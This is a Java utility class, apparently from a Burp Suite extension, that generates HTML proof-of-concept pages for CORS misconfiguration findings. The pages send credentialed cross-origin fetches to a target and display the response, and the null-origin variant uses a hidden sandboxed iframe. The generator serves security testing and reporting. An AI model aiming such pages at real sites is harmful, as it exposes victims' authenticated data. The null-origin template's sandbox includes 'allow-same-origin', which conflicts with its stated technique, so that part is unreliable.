package burp.utils;

import burp.models.CorsFinding;

public class CorsPoCGenerator {

    public static String generate(CorsFinding finding) {
        if (finding.type == CorsFinding.IssueType.NULL_ORIGIN ||
            finding.type == CorsFinding.IssueType.NULL_ORIGIN_CREDENTIALS) {
            return generateNullOriginPoC(finding);
        }
        return generateFetchPoC(finding);
    }

    private static String generateFetchPoC(CorsFinding finding) {
        boolean withCredentials =
            finding.type == CorsFinding.IssueType.REFLECTED_ORIGIN_CREDENTIALS ||
            finding.type == CorsFinding.IssueType.CREDENTIALED_WILDCARD;

        String credentialsOption = withCredentials ? ", credentials: 'include'" : "";
        String acac = finding.responseAcac != null ? finding.responseAcac : "not present";
        String credentialsCall = credentialsOption.isEmpty() ? "" : "\n  { " + credentialsOption.trim() + " }";

        return String.format(
            "<!DOCTYPE html>\n" +
            "<html>\n" +
            "<head><meta charset=\"utf-8\"><title>CORS PoC — %s</title></head>\n" +
            "<body>\n" +
            "<!--\n" +
            "  CORS Vulnerability PoC\n" +
            "  Type    : %s\n" +
            "  Severity: %s\n" +
            "  Target  : %s\n" +
            "  Evidence:\n" +
            "    Access-Control-Allow-Origin: %s\n" +
            "    Access-Control-Allow-Credentials: %s\n" +
            "-->\n" +
            "<h2>CORS PoC — %s</h2>\n" +
            "<pre id=\"output\">Sending request...</pre>\n" +
            "<script>\n" +
            "fetch('%s'%s)\n" +
            "  .then(r => r.text())\n" +
            "  .then(data => {\n" +
            "    document.getElementById('output').textContent = data;\n" +
            "  })\n" +
            "  .catch(err => {\n" +
            "    document.getElementById('output').textContent = 'Error: ' + err;\n" +
            "  });\n" +
            "</script>\n" +
            "</body>\n" +
            "</html>\n",
            finding.type,
            finding.type, finding.severity,
            finding.url,
            finding.responseAcao != null ? finding.responseAcao : "(none)",
            acac,
            finding.type,
            finding.url,
            credentialsCall
        );
    }

    private static String generateNullOriginPoC(CorsFinding finding) {
        boolean withCredentials = finding.type == CorsFinding.IssueType.NULL_ORIGIN_CREDENTIALS;
        String credentialsOption = withCredentials ? ", credentials: 'include'" : "";
        String acac = finding.responseAcac != null ? finding.responseAcac : "not present";
        String credentialsCall = credentialsOption.isEmpty() ? "" : "\n      { " + credentialsOption.trim() + " }";

        String innerScript = String.format(
            "fetch('%s'%s)\n" +
            "  .then(r => r.text())\n" +
            "  .then(data => parent.document.getElementById('output').textContent = data)\n" +
            "  .catch(err => parent.document.getElementById('output').textContent = 'Error: ' + err);",
            finding.url,
            credentialsCall
        );

        String escapedScript = innerScript.replace("\"", "&quot;").replace("<", "&lt;").replace(">", "&gt;");

        return String.format(
            "<!DOCTYPE html>\n" +
            "<html>\n" +
            "<head><meta charset=\"utf-8\"><title>CORS Null Origin PoC — %s</title></head>\n" +
            "<body>\n" +
            "<!--\n" +
            "  CORS Vulnerability PoC — Null Origin Bypass\n" +
            "  Type    : %s\n" +
            "  Severity: %s\n" +
            "  Target  : %s\n" +
            "  Evidence:\n" +
            "    Access-Control-Allow-Origin: %s\n" +
            "    Access-Control-Allow-Credentials: %s\n" +
            "  Technique: sandboxed iframe sends Origin: null\n" +
            "-->\n" +
            "<h2>CORS Null Origin PoC</h2>\n" +
            "<pre id=\"output\">Sending request via sandboxed iframe...</pre>\n" +
            "<iframe sandbox=\"allow-scripts allow-same-origin\"\n" +
            "        srcdoc=\"<script>%s</script>\"\n" +
            "        style=\"display:none\">\n" +
            "</iframe>\n" +
            "</body>\n" +
            "</html>\n",
            finding.type,
            finding.type, finding.severity,
            finding.url,
            finding.responseAcao != null ? finding.responseAcao : "(none)",
            acac,
            escapedScript
        );
    }
}
